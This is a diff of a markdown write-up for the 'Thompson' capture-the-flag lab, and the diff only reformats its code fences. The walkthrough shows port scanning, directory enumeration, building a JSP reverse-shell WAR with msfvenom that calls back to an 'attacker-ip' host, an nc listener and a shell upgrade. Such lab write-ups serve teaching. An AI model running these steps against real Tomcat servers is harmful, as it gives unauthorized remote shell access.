@@ -11,17 +11,16 @@ This Write-up/Walkthrough provides my process for the **Thompson** *(THM)* CTF. 
 
 As always, I'll start with the scan
 
-```bash
+```
 nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 10.113.131.119 -oG openPorts.log
 
-###
 
 cat openPorts.log
   Host: 10.113.131.119 ()	Status: Up
   Host: 10.113.131.119 ()	Ports: 22/open/tcp//ssh///, 8009/open/tcp//ajp13///, 8080/open/tcp//http-proxy///
+```
 
-###
-
+```
 nmap -p22,8009,8080 -sV -sC 10.113.131.119
 
   PORT     STATE SERVICE VERSION
@@ -54,7 +53,7 @@ Let's go to the website running on port 8080:
 
 I decided to ran `gobuster` to look for unusual directories
 
-```bash
+```
 gobuster dir -u http://10.113.131.119:8080 -w /usr/share/wordlists/dirb/common.txt -t 100 -q > directories.log
 ```
 
@@ -101,7 +100,7 @@ https://hackviser.com/tactics/pentesting/services/tomcat
 
 We run:
 
-```bash
+```
 msfvenom -l payloads | grep -i "jsp"  
   java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
   java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
@@ -109,7 +108,7 @@ msfvenom -l payloads | grep -i "jsp"
 
 Then:
 
-```bash
+```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f war > shell.war
   Payload size: 1091 bytes
   Final size of war file: 1091 bytes
@@ -119,7 +118,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f war > she
 
 Befire uploading the file, we first need to listen a port:
 
-```bash
+```
 nc -nlvp 4444
 ```
 
@@ -129,7 +128,7 @@ Once it has been deployed, navigate to the corresponding path (in my case `http:
 
 To make my work confortable, I did the following:
 
-```bash
+```
 export TERM=xterm
 ```
 
@@ -137,7 +136,7 @@ At least we could make `clear`.
 
 Then:
 
-```bash
+```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
